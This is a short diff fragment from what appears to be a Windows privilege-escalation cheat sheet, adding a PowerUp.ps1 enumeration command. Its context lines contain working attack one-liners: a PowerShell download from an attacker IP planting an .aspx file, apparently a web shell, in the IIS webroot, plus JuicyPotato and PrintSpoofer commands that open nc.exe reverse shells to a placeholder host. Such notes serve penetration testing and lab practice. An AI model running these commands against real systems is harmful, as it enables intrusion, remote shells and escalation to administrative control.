@@ -367,6 +367,9 @@ whoami /groups
 # Quick PowerShell upload transgfer
 powershell iwr 10.10.16.52/nothinghere.aspx -outfile "C:\inetpub\wwwroot\nothinghere.aspx"
 
+# Enumeration with PowerUp.ps1
+C:\Users\Public>powershell -command "& { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }"
+
 # SeImpersonate and SeAssignPrimaryToken
 c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd.exe" -t *
 c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd"
